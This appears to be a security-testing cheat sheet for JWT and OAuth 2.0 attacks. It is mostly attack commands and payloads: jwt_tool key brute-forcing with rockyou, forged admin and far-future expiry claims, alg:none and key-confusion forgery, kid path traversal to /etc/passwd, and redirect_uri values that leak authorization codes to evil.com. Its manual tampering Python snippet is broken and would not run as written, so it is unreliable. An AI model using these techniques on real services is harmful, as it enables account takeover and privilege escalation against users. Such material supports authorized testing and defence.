# JWT + OAuth 2.0 Security Testing

## JWT Attack Surface

### 1. Algorithm Confusion

```bash
# alg:none — Most classic
# Original: {"alg":"RS256","typ":"JWT"}.payload.signature
# Attack: {"alg":"none","typ":"JWT"}.payload.  (Empty signature)

# RS256 → HS256 Key confusion
# If the server uses RS256 public key for HS256 validation
# You can use the public key as HMAC key to sign
python3 jwt_tool.py <JWT> -X k -pk public.pem

# kid injection
# {"alg":"HS256","kid":"../../../../etc/passwd"}
# Server uses the file content pointed by kid as HMAC key
```

### 2. jwt_tool Full Usage

```bash
# Comprehensive scan
python3 jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"

# Weak key brute force
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# Claim tampering
python3 jwt_tool.py <JWT> -I -pc role -pv admin
python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999

# RSA Key confusion
python3 jwt_tool.py <JWT> -X k -pk public.pem

# Embed JWK
python3 jwt_tool.py <JWT> -X i
```

### 3. Manual JWT Tampering

```python
import jwt
import base64

# Decode (without validation)
header, payload, sig = jwt.split('.')

# Tamper payload
payload['role'] = 'admin'
payload['exp'] = 9999999999

# alg:none
new_token = base64url_encode(header) + '.' + base64url_encode(payload) + '.'

# HS256 with known key
new_token = jwt.encode(payload, 'secret', algorithm='HS256')
```

## OAuth 2.0 Attack Surface

### Authorization Code Grant

```text
1. redirect_uri manipulation
   Normal: https://app.com/callback?code=AUTH_CODE
   Attack: https://app.com/callback@evil.com?code=AUTH_CODE
         https://evil.com/?redirect=https://app.com/callback?code=AUTH_CODE
         Open redirect + redirect_uri: https://app.com/callback?redirect=https://evil.com

2. CSRF via missing state
   No state parameter → Attacker binds victim session with their own code

3. Missing PKCE
   No code_challenge → Authorization code interception attack

4. Token leakage in Referer
   Callback page loads external resources → Referer header contains code/token
```

### Implicit Grant (Deprecated but still deployed)

```text
1. access_token in URL fragment → Referer leakage
2. token in browser history → Physical access risk
3. No client authentication → token replacement attack
```

### Client Credentials Grant

```text
1. client_secret leakage (Hardcoded in frontend/mobile)
2. Excessive scope granted
3. No client rate limiting → Brute force enumeration
```

### General OAuth Testing

```text
□ Test scope escalation: scope=read → scope=read%20write
□ Token replay: Use old access_token to access new resources
□ Refresh token abuse: refresh_token infinite renewal
□ Cross-tenant access: token from tenant A accesses tenant B
□ Token leakage in logs/URL/Referer
```

## Tools

```bash
# JWT Testing
pip install jwt-tool pyjwt

# OAuth Testing
# Burp Suite + OAuth Scanner extension
# Postman OAuth 2.0 flow testing

# Automation
# Entropy: Automatic JWT tampering + OAuth redirect_uri testing
```

Source: OWASP API Top 10 (API2: Broken Authentication), jwt_tool, PortSwigger OAuth research
